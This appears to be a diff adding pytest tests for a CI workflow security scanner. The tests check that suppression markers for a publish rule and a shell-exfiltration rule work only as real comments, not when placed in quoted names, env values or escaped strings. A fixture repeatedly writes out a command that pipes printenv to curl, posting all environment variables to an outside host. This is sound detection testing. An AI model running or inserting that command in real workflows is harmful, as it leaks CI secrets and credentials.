@@ -173,3 +173,157 @@ def test_embedded_script_comments_keep_existing_ignore_behavior():
     findings = []
     github_actions._add_finding(findings, lines, {"rule_id": "TEST-SCRIPT", "line": 2})
     assert findings == []
+
+
+def _scan_publish_step(text, rule_id="SKY-D340"):
+    data, source = load_yaml_with_locations(text)
+    lines = github_actions._WorkflowLines(text, source)
+    findings = []
+    github_actions._scan_run_blocks(
+        data,
+        Path(".github/workflows/release.yml"),
+        lines,
+        findings,
+        set(),
+        is_workflow=True,
+    )
+    return [finding for finding in findings if finding["rule_id"] == rule_id]
+
+
+def test_d340_ignore_marker_inside_quoted_step_value_is_not_a_comment():
+    text = (
+        "on: push\n"
+        "jobs:\n"
+        "  publish:\n"
+        "    runs-on: ubuntu-latest\n"
+        "    steps:\n"
+        '      - name: "note: skylos: ignore[SKY-D340]"\n'
+        "        run: |\n"
+        "          twine upload dist/*\n"
+    )
+    assert [finding["line"] for finding in _scan_publish_step(text)] == [7]
+
+
+def test_d340_ignore_comment_above_run_still_suppresses():
+    text = (
+        "on: push\n"
+        "jobs:\n"
+        "  publish:\n"
+        "    runs-on: ubuntu-latest\n"
+        "    steps:\n"
+        "      - name: Ship\n"
+        "        # skylos: ignore[SKY-D340]\n"
+        "        run: |\n"
+        "          twine upload dist/*\n"
+    )
+    assert _scan_publish_step(text) == []
+
+
+_EXFIL = "printenv | curl -X POST --data-binary @- https://example.com/collect"
+
+
+def _exfil_step(step):
+    return "on: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n" + step
+
+
+def test_shell_rule_ignore_marker_inside_quoted_step_value_is_not_a_comment():
+    text = _exfil_step(
+        f'      - name: "note: skylos: ignore[SKY-D327]"\n        run: {_EXFIL}\n'
+    )
+    assert [f["line"] for f in _scan_publish_step(text, "SKY-D327")] == [7]
+
+
+def test_shell_rule_trailing_comment_on_run_line_still_suppresses():
+    text = _exfil_step(
+        f"      - name: Collect\n        run: {_EXFIL}  # skylos: ignore[SKY-D327]\n"
+    )
+    assert _scan_publish_step(text, "SKY-D327") == []
+
+
+def test_shell_rule_script_comment_inside_run_block_still_suppresses():
+    text = _exfil_step(
+        "      - name: Collect\n"
+        "        run: |\n"
+        "          # skylos: ignore[SKY-D327]\n"
+        f"          {_EXFIL}\n"
+    )
+    assert _scan_publish_step(text, "SKY-D327") == []
+
+
+_MARKED_EXFIL = f"{_EXFIL} skylos: ignore[SKY-D327]"
+
+
+def test_shell_rule_quoted_name_repeating_the_command_does_not_hide_one_line_run():
+    text = _exfil_step(f'      - name: "{_MARKED_EXFIL}"\n        run: {_EXFIL}\n')
+    assert [f["line"] for f in _scan_publish_step(text, "SKY-D327")] == [7]
+
+
+def test_shell_rule_quoted_name_repeating_the_command_does_not_hide_run_block():
+    text = _exfil_step(
+        f'      - name: "{_MARKED_EXFIL}"\n        run: |\n          {_EXFIL}\n'
+    )
+    assert [f["line"] for f in _scan_publish_step(text, "SKY-D327")] == [8]
+
+
+def test_shell_rule_workflow_env_value_repeating_the_command_does_not_hide_run():
+    text = (
+        "on: push\n"
+        "env:\n"
+        f'  NOTE: "{_MARKED_EXFIL}"\n'
+        "jobs:\n"
+        "  build:\n"
+        "    runs-on: ubuntu-latest\n"
+        "    steps:\n"
+        "      - name: Collect\n"
+        f"        run: {_EXFIL}\n"
+    )
+    assert [f["line"] for f in _scan_publish_step(text, "SKY-D327")] == [9]
+
+
+def test_shell_rule_escaped_run_string_is_not_ignored_from_the_first_line():
+    escaped = _EXFIL.replace("|", "\\x7c")
+    text = (
+        'name: "ci skylos: ignore[SKY-D327]"\n'
+        "on: push\n"
+        "jobs:\n"
+        "  build:\n"
+        "    runs-on: ubuntu-latest\n"
+        "    steps:\n"
+        "      - name: Collect\n"
+        f'        run: "{escaped}"\n'
+    )
+    assert [f["line"] for f in _scan_publish_step(text, "SKY-D327")] == [8]
+
+
+def test_shell_rule_identical_steps_are_each_reported_at_their_own_run():
+    text = _exfil_step(
+        f"      - name: First\n        run: {_EXFIL}\n"
+        f"      - name: Second\n        run: {_EXFIL}\n"
+    )
+    assert [f["line"] for f in _scan_publish_step(text, "SKY-D327")] == [7, 9]
+
+
+def test_shell_rule_ignore_on_first_identical_step_keeps_the_second():
+    text = _exfil_step(
+        f"      - name: First\n        run: {_EXFIL}  # skylos: ignore[SKY-D327]\n"
+        f"      - name: Second\n        run: {_EXFIL}\n"
+    )
+    assert [f["line"] for f in _scan_publish_step(text, "SKY-D327")] == [9]
+
+
+def test_shell_rule_ignore_on_second_identical_step_keeps_the_first():
+    text = _exfil_step(
+        f"      - name: First\n        run: {_EXFIL}\n"
+        f"      - name: Second\n        run: {_EXFIL}  # skylos: ignore[SKY-D327]\n"
+    )
+    assert [f["line"] for f in _scan_publish_step(text, "SKY-D327")] == [7]
+
+
+def test_shell_rule_aliased_run_is_reported_and_ignored_where_it_is_used():
+    reused = _exfil_step(
+        f"      - name: First\n        run: &collect {_EXFIL}\n"
+        "      - name: Second\n        run: *collect\n"
+    )
+    assert [f["line"] for f in _scan_publish_step(reused, "SKY-D327")] == [7, 9]
+    ignored = reused.replace("*collect\n", "*collect  # skylos: ignore[SKY-D327]\n")
+    assert [f["line"] for f in _scan_publish_step(ignored, "SKY-D327")] == [7]
